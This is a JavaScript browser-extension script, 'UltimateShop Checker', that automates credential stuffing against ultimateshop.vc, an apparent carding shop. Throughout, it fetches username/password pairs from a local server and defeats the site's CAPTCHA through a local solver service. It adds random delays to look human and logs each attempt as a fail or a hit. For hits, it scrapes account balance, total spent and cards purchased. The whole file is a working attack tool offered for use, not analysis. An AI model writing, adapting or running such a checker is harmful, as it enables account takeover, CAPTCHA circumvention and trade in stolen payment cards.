// UltimateShop Checker - Final Version (Multiple Tabs Support)
// Function to generate a random delay between 1 and 3 seconds
function getRandomDelay() {
    return Math.floor(Math.random() * 2000) + 1000; // 1000 to 3000 ms
}

// Check if we're on the login page
function isLoginPage() {
    return window.location.href.includes('ultimateshop.vc') && 
           document.querySelector('#LoginForm_username');
}

// Check if we're on the success page (news page with discount text)
function isSuccessPage() {
    return window.location.href.includes('/news') && 
           document.body.textContent.includes('Discount :');
}

// Check if we're on the profile page
function isProfilePage() {
    return window.location.href.includes('/profile');
}

// Extract balance and stats from profile page
function extractProfileData() {
    try {
        // Extract Current Balance
        const balanceRow = Array.from(document.querySelectorAll('td')).find(td => 
            td.textContent.trim() === 'Current balance:'
        );
        let balance = '0.00';
        if (balanceRow && balanceRow.nextElementSibling) {
            balance = balanceRow.nextElementSibling.textContent.trim();
        }

        // Extract Total Spent
        const spentRow = Array.from(document.querySelectorAll('td')).find(td => 
            td.textContent.trim() === 'Total spent:'
        );
        let totalSpent = '0';
        if (spentRow && spentRow.nextElementSibling) {
            totalSpent = spentRow.nextElementSibling.textContent.trim();
        }

        // Extract Cards Purchased
        const cardsRow = Array.from(document.querySelectorAll('td')).find(td => 
            td.textContent.trim() === 'Cards purchased:'
        );
        let cardsPurchased = '0';
        if (cardsRow && cardsRow.nextElementSibling) {
            cardsPurchased = cardsRow.nextElementSibling.textContent.trim();
        }

        return {
            balance: balance,
            totalSpent: totalSpent,
            cardsPurchased: cardsPurchased
        };
    } catch (error) {
        console.error('Error extracting profile data:', error);
        return {
            balance: '0.00',
            totalSpent: '0',
            cardsPurchased: '0'
        };
    }
}

// Navigate to profile page after successful login
function navigateToProfile() {
    if (window.location.href.includes('/news')) {
        console.log('UltimateShop Checker: Navigating to profile page...');
        window.location.href = 'https://ultimateshop.vc/profile';
    }
}

// Get the error message from the page
function getErrorMessage() {
    const bodyText = document.body.innerText;
    if (bodyText.includes('The verification code is incorrect')) {
        return 'The verification code is incorrect';
    } else if (bodyText.includes('Incorrect username or password')) {
        return 'Incorrect username or password';
    }
    return null;
}

// Retry login with new CAPTCHA using same credentials
async function retryWithNewCaptcha() {
    const usernameInput = document.querySelector('#LoginForm_username');
    const passwordInput = document.querySelector('#LoginForm_password');
    const captchaImg = document.querySelector('#yw0');
    const captchaInput = document.querySelector('#LoginForm_verifyCode');
    const submitButton = document.querySelector('#login-form > div > div > div > div > div > div.mb-3.mb-0.text-center > button');

    if (!usernameInput || !passwordInput || !captchaImg || !captchaInput || !submitButton) {
        console.log('UltimateShop Checker: Form elements not found for retry.');
        return;
    }

    const username = sessionStorage.getItem('current_username');
    const password = sessionStorage.getItem('current_password');
    if (!username || !password) {
        console.log('UltimateShop Checker: No credentials found for retry.');
        return;
    }

    usernameInput.value = username;
    passwordInput.value = password;

    try {
        const canvas = document.createElement('canvas');
        canvas.width = captchaImg.width;
        canvas.height = captchaImg.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(captchaImg, 0, 0);
        const base64Image = canvas.toDataURL().split(',')[1];

        const captchaResponse = await fetch('http://localhost:5050/solve-captcha', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: base64Image })
        });
        if (!captchaResponse.ok) throw new Error('Failed to solve CAPTCHA');
        const { captcha: solvedCaptcha } = await captchaResponse.json();

        captchaInput.value = solvedCaptcha;
        console.log('UltimateShop Checker: Filled new CAPTCHA.');

        const delay = getRandomDelay();
        setTimeout(() => {
            submitButton.click();
            console.log('UltimateShop Checker: Clicked login button for retry.');
        }, delay);
    } catch (error) {
        console.error('UltimateShop Checker: Error during retry with new CAPTCHA:', error);
    }
}

// Perform the full login automation on the login page
async function performLoginAutomation() {
    const usernameInput = document.querySelector('#LoginForm_username');
    const passwordInput = document.querySelector('#LoginForm_password');
    const captchaImg = document.querySelector('#yw0');
    const captchaInput = document.querySelector('#LoginForm_verifyCode');
    const submitButton = document.querySelector('#login-form > div > div > div > div > div > div.mb-3.mb-0.text-center > button');

    if (!usernameInput || !passwordInput || !captchaImg || !captchaInput || !submitButton) {
        console.log('UltimateShop Checker: Form elements not found on login page.');
        return;
    }

    try {
        const credsResponse = await fetch('http://localhost:5050/get-creds');
        if (!credsResponse.ok) {
            if (credsResponse.status === 404) {
                console.log('UltimateShop Checker: No credentials left.');
                return;
            }
            throw new Error('Failed to fetch credentials');
        }
        const { username, password } = await credsResponse.json();

        sessionStorage.setItem('current_username', username);
        sessionStorage.setItem('current_password', password);

        usernameInput.value = username;
        passwordInput.value = password;
        console.log('UltimateShop Checker: Filled username and password.');

        const canvas = document.createElement('canvas');
        canvas.width = captchaImg.width;
        canvas.height = captchaImg.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(captchaImg, 0, 0);
        const base64Image = canvas.toDataURL().split(',')[1];

        const captchaResponse = await fetch('http://localhost:5050/solve-captcha', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: base64Image })
        });
        if (!captchaResponse.ok) throw new Error('Failed to solve CAPTCHA');
        const { captcha: solvedCaptcha } = await captchaResponse.json();

        captchaInput.value = solvedCaptcha;
        console.log('UltimateShop Checker: Filled CAPTCHA.');

        const delay = getRandomDelay();
        setTimeout(() => {
            submitButton.click();
            console.log('UltimateShop Checker: Clicked login button.');
        }, delay);
    } catch (error) {
        console.error('UltimateShop Checker: Error during login automation:', error);
    }
}

// Handle navigation and login based on the current page
function handlePage() {
    console.log('UltimateShop Checker: Current URL:', window.location.href);
    
    if (isLoginPage()) {
        console.log('UltimateShop Checker: Handling login page...');
        const error = getErrorMessage();
        if (error) {
            if (error === 'The verification code is incorrect') {
                retryWithNewCaptcha();
            } else if (error === 'Incorrect username or password') {
                // Report as FAIL
                const username = sessionStorage.getItem('current_username');
                const password = sessionStorage.getItem('current_password');
                if (username && password) {
                    chrome.runtime.sendMessage({
                        type: 'fail_detected',
                        username,
                        password
                    });
                    sessionStorage.removeItem('current_username');
                    sessionStorage.removeItem('current_password');
                }
                // Try next account
                setTimeout(performLoginAutomation, 1000);
            }
        } else {
            performLoginAutomation();
        }
    } else if (isSuccessPage()) {
        console.log('UltimateShop Checker: Login successful! Navigating to profile...');
        // Navigate to profile page after successful login
        setTimeout(navigateToProfile, 2000);
    } else if (isProfilePage()) {
        console.log('UltimateShop Checker: On profile page, extracting data...');
        const username = sessionStorage.getItem('current_username');
        const password = sessionStorage.getItem('current_password');
        if (username && password) {
            const profileData = extractProfileData();
            console.log('UltimateShop Checker: Profile data extracted:', profileData);
            
            chrome.runtime.sendMessage({
                type: 'hit_detected',
                username,
                password,
                balance: profileData.balance,
                totalSpent: profileData.totalSpent,
                cardsPurchased: profileData.cardsPurchased
            });
            sessionStorage.removeItem('current_username');
            sessionStorage.removeItem('current_password');
            
            // Auto-refresh tab for next account after 3 seconds
            setTimeout(() => {
                console.log('UltimateShop Checker: Refreshing tab for next account...');
                window.location.reload();
            }, 3000);
        }
    }
}

// Auto-start account checking when page loads
function autoStartChecking() {
    console.log('UltimateShop Checker: Auto-starting account checking...');
    
    // Check if we already have credentials in session
    const currentUsername = sessionStorage.getItem('current_username');
    const currentPassword = sessionStorage.getItem('current_password');
    
    if (!currentUsername || !currentPassword) {
        // No credentials in session, start fresh
        if (isLoginPage()) {
            console.log('UltimateShop Checker: Starting fresh login automation...');
            setTimeout(performLoginAutomation, 1000);
        }
    } else {
        // We have credentials, continue with current flow
        handlePage();
    }
}

// Run when the page loads
window.addEventListener('load', () => {
    console.log('UltimateShop Checker: Page loaded, auto-starting...');
    autoStartChecking();
});

// Also run when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    console.log('UltimateShop Checker: DOM ready, checking page...');
    autoStartChecking();
});

// Observe DOM changes for dynamic content
const observer = new MutationObserver(() => {
    // Only handle page if we don't have current credentials
    if (!sessionStorage.getItem('current_username')) {
        handlePage();
    }
});
observer.observe(document.body, { childList: true, subtree: true });

// Auto-refresh page if stuck on login for too long
setInterval(() => {
    if (isLoginPage() && !sessionStorage.getItem('current_username')) {
        console.log('UltimateShop Checker: Page stuck, refreshing...');
        window.location.reload();
    }
}, 30000); // 30 seconds